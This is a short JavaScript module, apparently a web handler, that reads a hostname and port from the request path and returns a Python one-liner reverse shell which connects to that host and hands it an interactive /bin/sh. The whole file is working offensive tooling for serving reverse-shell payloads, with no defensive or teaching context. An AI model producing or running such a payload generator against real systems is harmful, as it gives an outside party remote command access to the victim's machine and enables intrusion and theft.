'use strict';

const generatePayload = (hostname, port) => `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${hostname}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;

const reverseShell = req => {
	const [, hostname, ip] = req.url.split('/');

	return generatePayload(hostname, ip);
};

module.exports = reverseShell;
